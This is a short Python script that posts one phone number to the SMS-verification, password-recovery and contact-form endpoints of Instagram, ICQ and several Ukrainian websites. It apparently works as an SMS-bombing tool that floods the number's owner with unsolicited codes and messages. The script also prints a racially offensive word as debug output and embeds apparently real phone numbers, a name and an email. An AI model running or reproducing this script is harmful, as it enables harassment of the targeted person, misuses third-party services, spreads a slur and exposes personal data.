import os

import requests

def requester():
    try:
        try:
            r = requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/?hl=ru", json={"email_or_username": "0635996120", "recaptcha_challenge_field": "", "flow": "", "app_id": "", "source_account_id": ""}, timeout=1000)
            test = r.status_code 
            print (test)
        except:
            pass
        try:
            r = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": "380635996120", "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, timeout=1000)
            test = r.status_code 
            print (test)
        except:
            pass
        try:
            r = requests.post("https://api.toplyvo.app/api/v2/client/create_code", json={"phone": "+380635996120"}, timeout=1000)
            test = r.status_code 
            print (test)
        except:
            pass
        try:
            r = requests.post("https://brain.com.ua/api/v1/recovery_pass/create", json={"phone": "0635996120"}, timeout=1000)
            test = r.status_code 
            print (test)
        except:
            pass
        try:
            r = requests.post("https://bonum-studio.com/wp/wp-admin/admin-ajax.php", json={"action": "sendApi", "template": "main", "theme": "Страница Наши цены", "label": "Order", "name": "slavik", "phone": "+380663733873", "email": "slavik@test.com", "comment": "sqaqsas13gb", "development-check-check": "on"}, timeout=1000)
            test = r.status_code
            print ("negro")
            print (test)
            print ("negro")
        except:
            pass
        try:
            r = requests.post("https://urban-point.com.ua/wp-json/contact-form-7/v1/contact-forms/538/feedback", json={"phone": "0636666666"}, timeout=1000)
            test = r.status_code 
            print (test)
        except:
            pass
    except:
        pass
    print("done")
requester()


